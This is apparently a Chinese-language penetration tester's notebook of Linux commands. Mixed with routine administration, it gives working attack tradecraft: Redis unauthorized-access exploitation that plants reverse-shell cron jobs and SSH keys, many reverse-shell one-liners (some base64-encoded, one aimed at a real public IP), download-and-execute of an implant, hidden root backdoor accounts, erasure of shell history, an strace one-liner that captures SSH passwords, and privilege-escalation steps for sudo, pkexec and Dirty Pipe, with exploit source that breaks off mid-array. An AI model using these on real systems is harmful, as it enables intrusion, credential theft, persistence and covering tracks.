<a name="SUIei"></a>
### 查看路由
route <br />netstat -route <br />ip route 
<a name="bQbLp"></a>
### 免密钥登陆
在获得目标服务器账号密码的情况下进行免密钥登陆

本地：ssh-keygen<br />cd /root/.ssh<br />ssh-copy-id 服务器IP<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611332427761-4f2b92c5-fc66-4c5e-b1b9-97b3dab2c9f8.png#height=173&id=N7uPk&originHeight=346&originWidth=1088&originalType=binary&ratio=1&rotation=0&showTitle=false&size=348539&status=done&style=none&title=&width=544)<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614156489210-a5041fc6-3554-48f9-bfe9-da61f9777371.png#height=290&id=tK35z&originHeight=387&originWidth=747&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15900&status=done&style=none&title=&width=560)

直接写入密钥<br />echo "插入id_rsa.pub文件里的内容" >>authorized_keys<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1614915664367-4a5e4d7e-fb3d-4dff-b380-03f48365dcd0.png#height=121&id=Lwzil&originHeight=121&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23072&status=done&style=none&title=&width=1181)

# ssh-keygen<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626423508751-c9d22992-d5ea-496d-94d6-f6c4d7ed9127.png#height=270&id=p0O11&originHeight=359&originWidth=522&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73230&status=done&style=none&title=&width=392)

y.pub是需要放置目标机子的authorized_keys里，而y是需要认证登陆的密钥<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626423541850-1c134905-ae2e-49ca-851b-0ee54aa3f72b.png#height=138&id=xEWUs&originHeight=184&originWidth=620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54659&status=done&style=none&title=&width=465)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626423599680-dd5d265b-a681-4eb2-bd37-64817c821843.png#height=212&id=yvtcS&originHeight=283&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73685&status=done&style=none&title=&width=432)

<a name="iq6u4"></a>
#### xshell生成密钥登陆
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1654675868713-42b5fd7d-117c-43bb-91aa-4d534790da61.png#clientId=ucf5c0608-56b9-4&from=paste&height=270&id=ua4bdce6e&originHeight=338&originWidth=250&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24509&status=done&style=none&taskId=u5c301857-f298-4932-9e00-49b9b77b709&title=&width=200)<br />然后点击生成，狂点下一步，就ok了，生成的pub文件，保存到目标的authorized_keys文件<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1654675813824-9e387387-22f4-4950-a603-53598cc81bda.png#clientId=ucf5c0608-56b9-4&from=paste&height=388&id=ua2e9d155&originHeight=485&originWidth=636&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17473&status=done&style=none&taskId=u2435cab6-7e58-4adf-ba25-8fe390b0226&title=&width=508.8)<br />这样子就可以登陆成功了<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1654675947806-c24c79cb-be5d-45af-a328-568f66576720.png#clientId=ucf5c0608-56b9-4&from=paste&height=638&id=u4a2fe40e&originHeight=798&originWidth=861&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64390&status=done&style=none&taskId=uc939b18c-2936-48df-8762-2cede8072a0&title=&width=688.8)
<a name="grgA3"></a>
### reids未授权
```java
比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(debian系列主机)
```
反弹shell<br />redis 192.168.242.134:6379> set x "\n* * * * * bash -i >& /dev/tcp/192.168.242.131/888 0>&1\n"<br />redis 192.168.242.134:6379> config set dir /var/spool/cron/<br />redis 192.168.242.134:6379> config set dbfilename root<br />redis 192.168.242.134:6379> save

-----------------------------------------------------------------------<br />1) 准备好自己的公钥，写入本地文件text.txt。<br />[root@localhost src]#ssh-keygen -t rsa    # 创建秘钥<br />[root@localhost src]#(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt<br /> <br />2) 通过redis将该文件写入内存<br />[root@localhost src]# ./redis-cli -h 192.168.242.134 flushall<br />[root@localhost src]# cat test.txt | redis-cli -h 192.168.242.134  -x  set  crackit    #链接redis 并将秘钥上传<br /> <br />3) 利用redis-cli 写入配置的方式将公钥写入到.ssh目录下<br />[root@localhost src]# redis-cli -h 192.168.242.134<br />192.168.242.134:6379> config set dir /root/.ssh/# 切到ssh目录去<br />192.168.242.134:6379> config get dir<br />192.168.242.134:6379> config set dbfilename "authorized_keys"# 保存到 authorized_keys 文件里<br />192.168.242.134:6379> save ssh -i id_rsa root@192.168.242.134# 保存并登陆<br />-------------------------------------------------------------------------------
<a name="4gQSN"></a>
### 清除痕迹
**vi进去 .bash_history 然后通过删除对应的历史记录，然后记得history -r更新一下，不然再看历史记录还是有的。**

**1、vi进去 .bash_history**<br />**2、history -r更新一下**

空格隐藏输入的命令 export HISTCONTROL=ignorespace  <br />history -c 不记录当前终端所输入的命令<br />该命令可以不记录我们在当前终端输入的所有命令<br />export HISTFILE=/dev/null export HISTSIZE=0<br /> <br />history N 显示最近的N条命令，例如history 5 <br />history -d N 删除第N条命令，这个N就是前面的编号，例如history -d 990 <br />history -c 清空命令历史 <br />history -a 将当前会话中的命令历史写入指定文件 <br />echo $HISTFILE 使用此命令查看环境变量<br /> <br />rm -f 文件名 (删除文件，不询问)<br />rm -r 文件夹 （递归删除文件夹）<br />rm -rf 文件或者目录<br /> <br />chmod 777 文件名 赋予最高权限<br />mkdir 创建目录<br />touch 创建文本<br />echo 'i love u'>>a.txt  *在a.txt这个文件中输入i love u，如果没有这个文件则创建.如果有这个文件，那么<br />新内容添加在原来内容的后面<br /> <br />[root@VM_16_16_centos /]# mv /Feng2/2.txt /feng/  把/Feng2/2.txt下的2.txt移动到/feng/这个目录<br />[root@VM_16_16_centos Feng2]# cp 2.txt /feng/ 把2.txt文件复制到/feng/这个目录下<br /> <br />d开头是目录，-开头是文件<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611332511428-b5996cce-deb2-4e20-bdf1-6ce664fd01fc.png#height=108&id=IsAQD&originHeight=216&originWidth=820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78027&status=done&style=none&title=&width=410)<br /> <br />authconfig --test|grep hashing 查看密码加密方式<br /> 
<a name="Q4VzL"></a>
#### 半交互shell下删除历史记录
有时候反弹shell，没办法使用vim进入.bash_history 要删除history的记录，可以使用以下方法：

sed '96,$d' -i .bash_history  删除从第96行（包括第96行）到文件末尾的所有行<br />history -r  更新一下
<a name="TUX5y"></a>
### 查看linux版本
uname -a<br />uname -sr<br />cat /etc/os-release
<a name="opCOd"></a>
### 用户
W查看哪些用户登录过该vps<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611332626206-4320481c-e97d-45ce-a00a-87a779895c0b.png#height=84&id=U7UcH&originHeight=168&originWidth=1003&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78050&status=done&style=none&title=&width=501.5)<br />Who 显示当前登录用户<br />Who mom likes<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611332639301-68c09afc-9bf5-4527-880c-e39a709572f8.png#height=146&id=Wxluw&originHeight=291&originWidth=1094&originalType=binary&ratio=1&rotation=0&showTitle=false&size=229187&status=done&style=none&title=&width=547)<br />su +用户名 切换用户<br />sudo 以root权限启动<br /> <br />passwd  不加参数更改当前用户密码<br />passwd linuxtime  指定修改用户密码，例如更改linuxtime用户密码<br />passwd -S linuxtime 获取linuxtime用户当前状态<br />passwd -d linuxtime 将linuxtime用户密码设置为空<br />adduser 用户名 添加用户<br />vim /etc/sudoers 添加全all，增加管理员权限<br />userdel linuxtime 删除linuxtime用户<br /> <br />du -ch ./ 读取该目录下文件夹的大小<br />du -sh 1.txt 读取该文件大小
<a name="PKEGO"></a>
### 查找
find /home -name "*.tar.gz"  查找home目录下tar.gz为扩展名的文件<br />find /home -name "*.tar.gz" -or -name "*.php" 查找home目录下tar.gz或php为扩展名的文件<br />find /home -type d -name "data" 查找home目录下名为data的目录<br />find /home -mtime -1 查找/home目录下24小内修改过的文件<br />find /home -name "*.txt" -exec rm -rf {} \; 查找/home目录下所有txt为扩展名的文件并删除<br />tree -L 3 树形显示多少级深度的目录和文件<br /> <br />find / -name 111.txt |while read f;do sh -c 'id;pwd;ifconfig' >$(dirname $f)/test.txt;done
<a name="UMiJP"></a>
### 后台跑脚本
nohup python3 shizhan.py &     把shizhan.py脚本放到后台跑 返回3308进程<br />ps -ef|grep 3308<br />kill -9 进程号<br /> <br />screen 挂后台，命令框掉了也不影响

1>/dev/null 2>&1 & 挂后台运行<br />./iox proxy -r ip:端口 1>/dev/null 2>&1 &

jobs -l<br />查看当前有多少在后台运行的命令

fg<br />将后台中的命令调至前台继续运行。如果后台中有多个命令，可以用fg %jobnumber（是命令编号，不是进程号）将选中的命令调出。  

比如nc反弹shell的时候，可以ctrl + z ，然后看jobs，这个时候进程还在的<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1650035315887-2e3629c0-352f-40e7-bc22-ed239d58bf0a.png#clientId=uca38b590-6a42-4&from=paste&height=315&id=u7e4a215e&originHeight=299&originWidth=458&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17802&status=done&style=none&taskId=uc3c1a86e-cbca-4cb9-acda-c036cfe9b22&title=&width=482.3999938964844)<br />然后重新进入，使用fg %<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1650035354505-62a80a1f-d5c6-4915-99d0-bafe5287d8bb.png#clientId=uca38b590-6a42-4&from=paste&height=283&id=u0534e225&originHeight=240&originWidth=396&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13533&status=done&style=none&taskId=ucffb456c-a6e5-4fc7-8e7e-b5ce976c84b&title=&width=466.8000183105469)

<a name="Et1WW"></a>
### 添加用户(后门)
需要输入两次  添加以python3为用户名、Qax@123为密码的root权限账号<br />useradd -p `openssl passwd -1 -salt 'salt' Qax@123` python3 -o -u 0 -g root -G root -s /bin/bash -d /home/python3

useradd mysql1 <br />echo mysql1:AaBb987 | chpasswd<br />echo "mysql1 ALL=(ALL) ALL" >> /etc/sudoers  <br />  
<a name="zs7Ja"></a>
### 复制和移动
cp -r dir1 dir2 表示将dir1及其dir1下所包含的文件复制到dir2下<br />cp 1.txt /root/ 表示将1.txt复制到root文件夹下<br /> <br />mv 1.txt /root/ 表示将1.txt移动到root文件夹下
<a name="1Z4tG"></a>
### 上传和下载、文件传输
上传<br />Xshell的sftp     ![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611332698520-a314e760-6247-41ac-adf2-ddf386064b43.png#height=24&id=ZpiO9&originHeight=48&originWidth=866&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22338&status=done&style=none&title=&width=433)<br />Put 本地windows路径<br />下载<br />输入Lcd 然后选择下载到本地的路径<br />sftp:/> get /root/feng/1.txt 要下载的文件<br /> <br /> <br />rz sz (前提是需要安装lrzsz包)<br />rz是上传<br />sz 文件名字<br /> 


SCP<br />1、将本机文件复制到远程服务器192.168.10.10的home目录<br />scp /home/local_test.zip [root@192.168.10.10:/home/](mailto:root@192.168.10.10/home/)<br />2、将远程服务器remote_test.zip文件复制到本地的/home目录<br />scp [root@192.168.10.10:/home/remote_test.zip /home/](mailto:root@192.168.10.10:/home/remote_test.zip%20/home/)<br />3、在本机操作另外两台服务器之间复制文件<br />scp -3 root@192.168.10.10:/root/filename [root@192.168.10.11:/home/](mailto:root@192.168.10.11:/home/)<br /> 
<a name="XIPSH"></a>
#### wget 下载并执行的方式
wget [https://abc.cn/x86_64.rpm](https://abc.cn/x86_64.rpm)

把文件下载到/tmp路径下，成功了就执行命令<br />wget [http://xxx/2.txt](http://121.4.236.95:8081/2.txt) -P /tmp/ && cat /tmp/2.txt

把文件下载到/tmp路径下，无论成功与否都会执行后者<br />wget [http://xxx/2.txt](http://121.4.236.95:8081/2.txt) -P /tmp/ || cat /tmp/2.txt<br />      || /tmp/test2   运行马子上线<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1622693807624-00700181-c96b-4bb5-8b47-ae78e92676a5.png#height=168&id=bWxLA&originHeight=168&originWidth=691&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77457&status=done&style=none&title=&width=691)

<a name="gjNz9"></a>
#### nc传输文件
接收文件的命令：<br />nc -lvvp 7777 > toprcms.war

发送文件的命令<br />nc 192.168.201.1 7777 < toprcms.war


<a name="OKTPv"></a>
### 反弹shell
Shell类型: sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh、bash<br />有时候bash不能用，用tcsh、sh就弹成功了

/usr/bin/tcsh -i >& /dev/tcp/192.168.110.78/6767 0>&1<br />exec /bin/sh 0</dev/tcp/192.168.99.242/1234 1>&0 2>&0

**base加密反弹shell(通常用于java**<br />bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDAuMTk5LjIwMC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}

nc反弹windows<br />nc.exe  -e cmd.exe  ip port 
<a name="VDs3t"></a>
### 批量抓密码命令

```c
strace -xx -fp `cat /var/run/sshd.pid`  2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1625533304371-49104b10-6d03-4565-8875-6ca36463249e.png#height=359&id=n9o5e&originHeight=479&originWidth=1431&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47015&status=done&style=none&title=&width=1073)


<a name="eLpCs"></a>
### 统计数量
wc<br />![图片.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1611332743892-de089535-9e06-4f54-ad10-c582c6159aeb.png#height=153&id=tDJ01&originHeight=306&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=214834&status=done&style=none&title=&width=544.5)

<a name="E5HLQ"></a>
### TCP后门
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1622817472277-798ea3d3-7408-4710-bd2e-885d79933b51.png#height=321&id=OkzBp&originHeight=427&originWidth=674&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29838&status=done&style=none&title=&width=506)
<a name="EYwBy"></a>
### 关于kali双网卡配置的问题
一般分eth0、eth1两张网卡。<br />如果eth0已经有桥接的ip了，就只需要操作eth1的ip配置就行<br /># vim /etc/network/interfaces  <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626432631459-a29a0c0c-6739-47c3-bfa0-ba70b1899a74.png#height=178&id=i0aP4&originHeight=237&originWidth=586&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74342&status=done&style=none&title=&width=440)
```
#auto lo
iface lo inet loopback
auto eth1
iface eth1 inet static
address 192.168.201.111
netmask 255.255.255.0
gateway 192.168.201.1
```
# systemctl restart networking 网络重启<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626432785140-03974cf4-f785-4af3-9f26-c4be84d7d288.png#height=316&id=O2k8v&originHeight=421&originWidth=658&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184395&status=done&style=none&title=&width=494)

或者直接设置dhcp，然后再重启网络<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1626448175547-10609939-0c73-4e31-bf86-0df9eede39ba.png#height=193&id=rIYdi&originHeight=193&originWidth=312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40320&status=done&style=none&title=&width=312)

<a name="zGZ7F"></a>
### awk
# awk -F: '{ print $1,$3 }' /etc/passwd<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627043523158-0aebad50-69eb-4377-92bc-d805731a9b31.png#height=344&id=z0RbI&originHeight=458&originWidth=498&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112683&status=done&style=none&title=&width=374)<br />awk <br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627088540022-44fc5dfe-6d82-4f97-810c-0b7c24c93b3f.png#height=250&id=LPoeb&originHeight=250&originWidth=209&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39598&status=done&style=none&title=&width=209)

# sed -i 'aaaaaaa' test.txt        //添加到最后一行<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627089864074-00a57799-3acc-4944-8879-eb2bfbf876b7.png#height=322&id=jBUHf&originHeight=322&originWidth=335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62143&status=done&style=none&title=&width=335)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1627090429745-25267fef-2205-4ff0-b613-eb22845b72cb.png#height=180&id=GGL3d&originHeight=180&originWidth=1606&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33401&status=done&style=none&title=&width=1606)

<a name="n7O7k"></a>
### 查看本机的外网ip
curl ip.sb<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1631240992276-44a6b875-eedc-4e18-b142-ade97a4dec84.png#clientId=u04aabf7a-a065-4&from=paste&id=u5859147e&originHeight=69&originWidth=435&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5857&status=done&style=none&taskId=u9c47cb62-abe1-45e3-bcd5-5a70d571f0e&title=)

<a name="vfc3i"></a>
### udp反弹shell
首先在本地监听UDP协议的监听端口<br />nc -lnuvp 443<br />然后在靶机上执行如下命令：<br />bash -i >& /dev/udp/10.10.10.11/443 0>&1  

<a name="UsJf7"></a>
### Linux通过进程ID查看文件路径
ls -l /proc/28120/exe<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1632580133867-dde60f9b-ec37-4f76-8e48-9e4d0688edab.png#clientId=u0895a849-f5b3-4&from=paste&height=53&id=ubf96239c&originHeight=71&originWidth=755&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9310&status=done&style=none&taskId=u198e5ede-e744-4b1a-ae93-0d0b631154a&title=&width=566)

<a name="zT3lc"></a>
### VI编辑方法
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1633575105083-f4f7fcdb-15ca-4056-b1fa-f3ab54527f76.png#clientId=ub50f79a5-7930-4&from=paste&height=370&id=u2ff4ebfa&originHeight=493&originWidth=896&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36927&status=done&style=none&taskId=u799e9295-8590-4517-ab3d-fd866947666&title=&width=672)<br /> 小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。  

<a name="FDJwY"></a>
### lsof (可看到调用的所有路径
1 lsof -i # 运行进程监听端口的细节信息<br />2 lsof -p [pid] # 显示进程使用的所有文件和端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639365295938-6158a0e5-6bc8-42c5-b9ea-f495ddff117d.png#clientId=ueefe6595-c1f3-4&from=paste&height=84&id=u5597ff16&originHeight=141&originWidth=894&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24686&status=done&style=none&taskId=u315b2518-d0e4-42bc-a534-ea16f869601&title=&width=535)<br />3 lsof -iTCP -P -n # 显示监听的tcp端口<br />4 lsof -R -p [pid] # 显示父进程ID,或者cat /proc/36995/status|grep PPid /ps -o ppid= -p 1111<br />5 lsof +L1 # select open files that have been unlinked

<a name="cC7g1"></a>
### 修改文件名
alias<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639464519893-a019ba96-cbed-4a74-be23-e7d8e3f52ad3.png#clientId=ub8921103-b99a-4&from=paste&height=284&id=ua4737ac7&originHeight=214&originWidth=220&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26553&status=done&style=none&taskId=u17dd64a1-8260-451e-b80e-c6824455f80&title=&width=292)

alias ls="whoami;ifconfig"<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639464540909-e85003cc-2164-4894-8479-87a9939f507e.png#clientId=ub8921103-b99a-4&from=paste&height=278&id=ufbabdaff&originHeight=434&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116155&status=done&style=none&taskId=u79e83f49-1319-4b4f-8b08-53aa3c311c9&title=&width=381.5)

删除创建的别名<br />用法：unalias 命令别名

<a name="jjqbJ"></a>
### 进程隐藏

echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNC4yMzYuOTUvODg4OCAwPiYxCg=="|base64 --decode|bash -i<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543045398-a4723e6d-ac37-4ede-85cd-a72b998cd611.png#clientId=u0cceb63d-6021-4&from=paste&height=93&id=u44825e22&originHeight=137&originWidth=791&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33338&status=done&style=none&taskId=u911928d3-cb7e-47d8-8140-6a77ad135de&title=&width=535.5)

这个时候bash是没有ip端口内容的<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543070033-3690c447-6ecb-4889-b806-0fde6b3dccf8.png#clientId=u0cceb63d-6021-4&from=paste&height=172&id=u5b663e54&originHeight=239&originWidth=771&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94389&status=done&style=none&taskId=ub82c8fce-ca42-4f0b-bb21-10bee2fb3fe&title=&width=554.5)

排查：

排查需要lsof -p去指定进程id，看到外联行为<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543141520-ea5a0e6d-5086-4c14-a9f2-79121f0ce51c.png#clientId=u0cceb63d-6021-4&from=paste&height=201&id=u6c999333&originHeight=350&originWidth=937&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138059&status=done&style=none&taskId=uc26e3d1e-6cde-405d-9cd8-67e9cf18493&title=&width=537.5)

使用strace -p指定进程ip，可以获取攻击者输入的命令内容<br />内容全局搜索write(2, 就能获取到攻击者执行的命令<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543319497-3bfeb453-b69e-4f84-b338-94f285b824f2.png#clientId=u0cceb63d-6021-4&from=paste&height=190&id=u68a724f9&originHeight=264&originWidth=615&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33446&status=done&style=none&taskId=u5fb636c8-37d2-439e-8099-d6cc33800c1&title=&width=442.5)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1639543333033-c8614715-39b7-4297-9e3f-bd0c6a324703.png#clientId=u0cceb63d-6021-4&from=paste&height=128&id=u47ada66b&originHeight=123&originWidth=424&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11094&status=done&style=none&taskId=ub9417813-cec9-468a-ab29-a28b3794a2a&title=&width=441)

<a name="gr8YW"></a>
### 通过env查看http_proxy设置的代理
env查看，通过export配置![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1641819520787-a19f899f-faa9-4e17-8ac5-6cbf1facb5af.png#clientId=u752d90fb-5671-4&from=paste&height=29&id=uec4f2cb3&originHeight=33&originWidth=413&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2095&status=done&style=none&taskId=ua2d42106-2625-4b38-adf0-a0dca944539&title=&width=361.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1641819187091-013838f8-c376-43ec-a112-50ae4ce3ab92.png#clientId=u752d90fb-5671-4&from=paste&height=484&id=u27d1bc2f&originHeight=404&originWidth=388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61723&status=done&style=none&taskId=u5af9c8f4-8fcb-4706-a81f-445126df347&title=&width=465)

<a name="eZyPR"></a>
### 查看linux服务器解析的域名

cat /etc/hosts

<a name="oV72P"></a>
### iptables 设置防火墙
**iptables -L -n  --line-number**  查看防火墙设置的规则<br />iptables -F    恢复原来设置<br />**设置白名单端口访问**<br />iptables -I INPUT -p tcp --dport 50070 -j DROP  禁止tcp 50070端口访问<br />iptables -I INPUT -s ip -ptcp --dport 50070 -j ACCEPT  设置白名单ip可以访问50070端口

以上设置完就会生效了，如果还不行，就需要<br />保存iptables<br /># service iptables save<br />重启防火墙<br />#service iptables restart

**如果对某一网段做限制可以直接执行如下命令：**<br />可直接使用如下命令代替：<br />iptables -I INPUT-s 192.168.1.0/24 -p tcp --dport 50070 -j ACCEPT

**删除规则**<br />iptables --help  (chain就是指出入站的类型<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648827574720-ee85cd72-bb78-4dae-b901-74e1b602e3e8.png#clientId=u39445cb0-001c-4&from=paste&height=114&id=u07e44343&originHeight=152&originWidth=709&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12671&status=done&style=none&taskId=ub693cfce-23d2-41d8-aa15-c5f36adefc2&title=&width=532)

iptables -D INPUT 2<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1648827757650-02b7c910-3954-452a-80ce-22fe68de3ad3.png#clientId=u39445cb0-001c-4&from=paste&height=277&id=u137d3002&originHeight=370&originWidth=847&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40172&status=done&style=none&taskId=u46f06228-4168-4509-b4be-4ba5af902ec&title=&width=635)
<a name="hmBbo"></a>
### 提权
<a name="tjbdT"></a>
#### sudo提权

漏洞版本影响 sudo 1.8.2 - 1.8.31p2<br />  sudo 1.9.0 - 1.9.5p1<br />sudo --version查看版本<br />提权文件下载[https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz](https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz)<br />然后切到对应的目录进行make编译，如下图所示，从test用户提权成功到root<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1642135527090-86d98280-deb4-476a-9edd-e2e8e025452f.png#clientId=u66640b0f-8837-4&from=paste&height=181&id=uc514fc14&originHeight=251&originWidth=604&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45288&status=done&style=none&taskId=uc3c9a4b8-b7c1-452b-8527-fb7204044d5&title=&width=436)

<a name="GnMVD"></a>
#### CVE-2021-4034
[https://github.com/berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034)<br />1、如果环境可以，尽量在目标机器上编译，提权完后再删除文件<br />2、如果环境不行，就本地编译好后，整个文件夹传上去，避免缺失.so文件啥的无法提权成功。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647062226046-9e908acb-c2f9-499d-9f9a-ad8a549747f6.png#clientId=ub2b2bbc8-7500-4&from=paste&height=235&id=uf8482fc4&originHeight=366&originWidth=780&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41090&status=done&style=none&taskId=u0a308a28-51f4-4c75-ab3b-b8fa3be6f33&title=&width=501)

<a name="ln9eU"></a>
#### CVE-2022-0847
**第一种方法(不推荐**<br />[https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/)<br />1、这个脚本其实覆盖了root用户的密码，为aaron <br />2、提权完需要把密码改回去，运行脚本的时候会复制了一份passwd.bak在/tmp目录下，所以直接移回去就好了。<br />mv /tmp/passwd.bak /etc/passwd<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647063503392-f1578fea-ddfb-4ad0-a05e-9216b6cb5a29.png#clientId=ub2b2bbc8-7500-4&from=paste&height=237&id=u29769641&originHeight=473&originWidth=1020&originalType=binary&ratio=1&rotation=0&showTitle=false&size=240615&status=done&style=none&taskId=ua73d77dd-23a7-495c-a823-b670417c918&title=&width=510)


**第二种方法(推荐**<br />下面是dirty.c文件
```java
// https://haxx.in/posts/pwning-tipc/
// dirtypipez.c
//
// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn
// a root shell. (and attempts to restore the damaged binary as well)
//
// Wow, Dirty CoW reloaded!
//
// -- blasty <peter@haxx.in> // 2022-03-07

/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// small (linux x86_64) ELF file matroshka doll that does;
//   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
//   write(fd, elfcode, elfcode_len)
//   chmod("/tmp/sh", 04755)
//   close(fd);
//   exit(0);
//
// the dropped ELF simply does:
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
unsigned char elfcode[] = {
  /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
